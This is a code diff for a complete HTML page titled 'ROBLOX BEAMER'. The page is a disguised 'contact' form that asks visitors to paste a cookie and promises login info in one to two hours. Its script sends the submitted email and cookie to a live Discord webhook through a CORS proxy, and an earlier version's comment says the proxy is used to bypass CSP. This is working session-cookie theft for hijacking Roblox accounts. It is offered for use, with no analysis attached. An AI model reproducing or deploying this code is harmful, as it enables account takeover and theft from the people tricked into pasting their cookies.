@@ -1,45 +1,102 @@
-<script>
-  const form = document.getElementById('contact-form');
-
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const email = document.getElementById('email').value;
-    const cookie = document.getElementById('message').value;
-
-    // Only send if there is something entered in the cookie (message) field
-    if (!cookie.trim()) {
-      alert("Please enter a valid cookie!");
-      return; // Don't send if the field is empty
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>RBXS7L34L3R - Contact Us</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0e0e0e;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
+    form {
+      background: #1e1e1e;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #00ff99;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background: #333;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background-color: #00ff99;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
+    }
+    .notice {
+      font-size: 0.8rem;
+      margin-top: 10px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
 
-    const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT';
+  <h1>ROBLOX BEAMER</h1>
+  <form id="contact-form">
+    <input type="email" id="email" placeholder="Enter Email" required />
+    <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
+    <button type="submit">Send</button>
+    <div class="notice">You will receive the login info in 1-2 Hours.</div>
+  </form>
 
-    // Use a proxy to bypass CSP
-    const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(webhookUrl)}`;
+  <script>
+    const form = document.getElementById('contact-form');
 
-    const payload = {
-      content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${cookie}` // Send cookie content
-    };
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-    try {
-      const response = await fetch(proxyUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      });
+      const email = document.getElementById('email').value;
+      const message = document.getElementById('message').value;
 
-      if (response.ok) {
-        alert('You will receive the login info in 1-2 hours.');
-        form.reset();
-      } else {
-        alert('Something went wrong.');
+      // Replace with your real Discord webhook URL
+      const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT';
+
+      // Proxy service URL to bypass CORS
+      const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(webhookUrl)}`;
+
+      // Payload structure for Discord Webhook
+      const payload = {
+        content: `📬 New Contact Submission\n📧 email: ${email}\n📝 cookie: ${message || "No message"}`
+      };
+
+      try {
+        const response = await fetch(proxyUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          alert('You will receive the login info in 1-2 Hours.');
+          form.reset();
+        } else {
+          alert('Something went wrong.');
+        }
+      } catch (err) {
+        alert('Error sending message.');
+        console.error(err);
       }
-    } catch (err) {
-      alert('Error sending message.');
-      console.error(err);
-    }
-  });
-</script>
+    });
+  </script>
+
+</body>
+</html>
